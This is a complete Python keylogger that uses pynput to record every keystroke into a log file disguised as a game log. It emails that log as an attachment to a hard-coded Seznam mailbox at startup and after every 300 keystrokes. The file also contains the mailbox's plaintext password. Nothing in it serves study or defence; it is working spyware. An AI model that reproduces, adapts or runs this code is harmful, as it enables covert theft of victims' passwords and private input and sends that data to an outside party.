import pynput
import smtplib
import os
import datetime
import platform
from pynput.keyboard import Key, Listener
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

count = 0
mailCount = 0
logNumber = 0
keys = []

path = os.path.abspath("C:/Games/GameLog.txt")
fileExists = os.path.isfile(path)
passw = "gormitihulk123"

if not fileExists:
    open(f"{path}", "w").close()

def sendmail():
    #Email Variables
    dateNow = datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S")

    email_user = "oplpet0@seznam.cz"
    email_send = "oplpet0@seznam.cz"
    email_password = "gormitihulk123"
    subject = f"{logNumber}. log {dateNow}"

    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject

    f = open(path, "r")

    body = f'{f.read()}'
    msg.attach(MIMEText(body,'plain'))

    filename = path #INSERT FILE LOCATION
    attachment = open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP_SSL('smtp.seznam.cz', 465)
    server.login(email_user, email_password)

    server.sendmail(email_user, email_send, text)
    server.quit()
    f.close()
    print("Email sended sucessfuly")

sendmail()

def onPress(key):
    global keys, count, mailCount, logNumber
    keys.append(key)
    count += 1
    mailCount +=1
    print(f"{key} pressed")

    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []
    
    if mailCount >= 300:
        mailCount = 0
        
        #Sends an email
        sendmail()
        logNumber += 1

def writeFile(keys):
    with open(f"{path}", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("96") > 0:
                f.write("0")
            if k.find("97") > 0:
                f.write("1")
            if k.find("98") > 0:
                f.write("2")
            if k.find("99") > 0:
                f.write("3")
            if k.find("100") > 0:
                f.write("4")
            if k.find("101") > 0:
                f.write("5")
            if k.find("102") > 0:
                f.write("6")
            if k.find("103") > 0:
                f.write("7")
            if k.find("104") > 0:
                f.write("8")
            if k.find("105") > 0:
                f.write("9")
            if k.find("space") > 0 or k.find("enter") > 0:
                f.write("\n")
            if k.find("backspace") > 0:
                f.write("<<")
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press=onPress, on_release=None) as listener:
    listener.join()